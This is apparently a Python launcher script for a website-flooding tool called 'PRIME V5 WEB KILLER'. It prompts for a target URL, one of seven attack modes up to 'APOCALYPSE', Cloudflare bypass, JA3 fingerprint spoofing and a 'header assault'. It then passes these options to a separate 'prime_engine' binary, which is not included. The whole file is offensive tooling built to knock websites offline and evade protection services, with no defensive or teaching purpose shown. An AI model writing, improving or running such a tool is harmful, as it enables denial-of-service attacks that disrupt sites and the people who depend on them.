#if u steal my code, ill beat yo ass
import os, pyfiglet, subprocess, sys
from colorama import Fore, Style, init

os.system('cls' if os.name=='nt' else 'clear')
init(autoreset=True)

def big_text(text,color):
    os.system('cls' if os.name=='nt' else 'clear')
    banner=pyfiglet.figlet_format(text,font="slant")
    print(color+banner+Style.RESET_ALL)

big_text("PRIME",Fore.RED)
print(Fore.RED+"V5 ☢︎︎ WEB KILLER\n")
print(Fore.RED+"MADE BY TEAM FSY\n")
print(Fore.RED + "AVAILABLE ATTACK MODE:\n\n• 1 - STANDARD\n• 2 - ULTRA\n• 3 - EXTREME\n• 4 - VERY EXTREME\n• 5 - APOCALYPSE\n☢ 6 - WEB KILLER\n☢ 7 - WEB KILLEE PRO\n")
target   = input(Fore.RED+"TARGET URL —> ").strip()
if not target: sys.exit("Target required!")
cf       = input(Fore.RED+"Cloudflare protected? (y/N): ").strip().lower()=='y'
mode     = input(Fore.RED+"Select mode (1-7, default 3): ").strip() or "3"
ja3      = input(Fore.RED+"Enable JA3 fingerprint spoofing? (Y/n): ").strip().lower()!='n'
auto_net = input(Fore.RED+"Auto Network error handling? (Y/n): ").strip().lower()!='n'
xt_hdr   = input(Fore.RED+"Enable header assault? (Y/n): ").strip().lower()!='n'

cmd=["./prime_engine","ULTIMATE",target,"--mode",mode]
if cf:       cmd+=["--cloudflare"]
if ja3:      cmd+=["--ja3"]
if xt_hdr:   cmd+=["--extreme-headers"]
if not auto_net: cmd+=["--autonetwork=false"]

subprocess.run(cmd)
